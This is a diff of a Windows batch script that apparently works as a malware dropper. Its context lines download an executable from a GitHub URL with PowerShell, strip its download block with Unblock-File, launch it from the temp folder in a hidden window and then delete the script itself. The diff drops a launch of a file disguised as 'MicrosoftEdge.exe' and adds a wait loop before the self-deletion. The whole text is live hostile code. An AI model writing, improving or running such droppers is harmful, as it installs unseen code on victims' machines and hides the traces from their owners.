@@ -10,9 +10,18 @@ if %errorlevel% == 0 (
     rem Unblock the ThirdFile.exe to avoid any execution blocks
     powershell -Command "Unblock-File -Path '%TEMP%\ThirdFile.exe'" >nul 2>&1
 
-    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1
+    rem Start the third file
     powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\ThirdFile.exe' -NoNewWindow" >nul 2>&1
 
+    rem Wait for the ThirdFile.exe to finish before continuing
+    :waitloop
+    tasklist /fi "imagename eq ThirdFile.exe" 2>NUL | find /I "ThirdFile.exe" >nul
+    if %errorlevel% == 0 (
+        timeout /t 1 >nul
+        goto waitloop
+    )
+
+    rem Continue once the file has finished executing
     del "%~f0" >nul 2>&1
     exit
 )
@@ -32,8 +41,17 @@ powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56
 rem Unblock the ThirdFile.exe to avoid any execution blocks
 powershell -Command "Unblock-File -Path '%TEMP%\ThirdFile.exe'" >nul 2>&1
 
-powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\MicrosoftEdge.exe'" >nul 2>&1
+rem Start the third file
 powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\ThirdFile.exe' -NoNewWindow" >nul 2>&1
 
+rem Wait for the ThirdFile.exe to finish before continuing
+:waitloop
+tasklist /fi "imagename eq ThirdFile.exe" 2>NUL | find /I "ThirdFile.exe" >nul
+if %errorlevel% == 0 (
+    timeout /t 1 >nul
+    goto waitloop
+)
+
+rem Continue once the file has finished executing
 del "%~f0" >nul 2>&1
 exit
